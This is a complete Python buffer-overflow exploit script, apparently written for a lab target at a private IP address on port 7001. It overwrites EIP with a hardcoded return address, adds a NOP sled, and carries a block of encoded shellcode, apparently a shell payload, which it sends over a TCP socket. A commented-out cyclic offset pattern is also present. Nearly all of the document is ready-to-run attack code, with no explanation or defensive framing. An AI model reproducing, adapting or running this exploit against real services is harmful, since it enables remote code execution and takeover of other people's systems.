#!/usr/bin/python
import socket, time, sys

try:
    

    print("\nSending Evil Buffer...")

    filler = "A" * 2288
    eip = "\xcf\x10\x80\x14"
    offset = "C" * 8
    #buffer = "D" * (2700 - len(filler) - len(eip) - len(offset))
    shellcode = ("\xbb\xa9\xc6\xb0\x76\xd9\xee\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\xf3\xc8\x52\x83\xff\x3d\x10"
"\x6c\xff\xbd\x75\xe4\x1a\x8c\xb5\x92\x6f\xbf\x05\xd0\x3d\x4c"
"\xed\xb4\xd5\xc7\x83\x10\xda\x60\x29\x47\xd5\x71\x02\xbb\x74"
"\xf2\x59\xe8\x56\xcb\x91\xfd\x97\x0c\xcf\x0c\xc5\xc5\x9b\xa3"
"\xf9\x62\xd1\x7f\x72\x38\xf7\x07\x67\x89\xf6\x26\x36\x81\xa0"
"\xe8\xb9\x46\xd9\xa0\xa1\x8b\xe4\x7b\x5a\x7f\x92\x7d\x8a\xb1"
"\x5b\xd1\xf3\x7d\xae\x2b\x34\xb9\x51\x5e\x4c\xb9\xec\x59\x8b"
"\xc3\x2a\xef\x0f\x63\xb8\x57\xeb\x95\x6d\x01\x78\x99\xda\x45"
"\x26\xbe\xdd\x8a\x5d\xba\x56\x2d\xb1\x4a\x2c\x0a\x15\x16\xf6"
"\x33\x0c\xf2\x59\x4b\x4e\x5d\x05\xe9\x05\x70\x52\x80\x44\x1d"
"\x97\xa9\x76\xdd\xbf\xba\x05\xef\x60\x11\x81\x43\xe8\xbf\x56"
"\xa3\xc3\x78\xc8\x5a\xec\x78\xc1\x98\xb8\x28\x79\x08\xc1\xa2"
"\x79\xb5\x14\x64\x29\x19\xc7\xc5\x99\xd9\xb7\xad\xf3\xd5\xe8"
"\xce\xfc\x3f\x81\x65\x07\xa8\x6e\xd1\x70\x8b\x07\x20\x7e\xda"
"\x8c\xad\x98\xb6\x22\xf8\x33\x2f\xda\xa1\xcf\xce\x23\x7c\xaa"
"\xd1\xa8\x73\x4b\x9f\x58\xf9\x5f\x48\xa9\xb4\x3d\xdf\xb6\x62"
"\x29\x83\x25\xe9\xa9\xca\x55\xa6\xfe\x9b\xa8\xbf\x6a\x36\x92"
"\x69\x88\xcb\x42\x51\x08\x10\xb7\x5c\x91\xd5\x83\x7a\x81\x23"
"\x0b\xc7\xf5\xfb\x5a\x91\xa3\xbd\x34\x53\x1d\x14\xea\x3d\xc9"
"\xe1\xc0\xfd\x8f\xed\x0c\x88\x6f\x5f\xf9\xcd\x90\x50\x6d\xda"
"\xe9\x8c\x0d\x25\x20\x15\x2d\xc4\xe0\x60\xc6\x51\x61\xc9\x8b"
"\x61\x5c\x0e\xb2\xe1\x54\xef\x41\xf9\x1d\xea\x0e\xbd\xce\x86"
"\x1f\x28\xf0\x35\x1f\x79")

    nops = "\x90" * 10
    inputBuffer = filler + eip + offset + nops + shellcode
    #inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
    new_buffer = bytes(inputBuffer)
    print(type(new_buffer))
    buffer=inputBuffer
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.163.10', 7001))
    s.send(inputBuffer)

    s.close()

    print("\nDone!")

except Exception as e: 
    print(e)
    print("Could not connect!")
    sys.exit()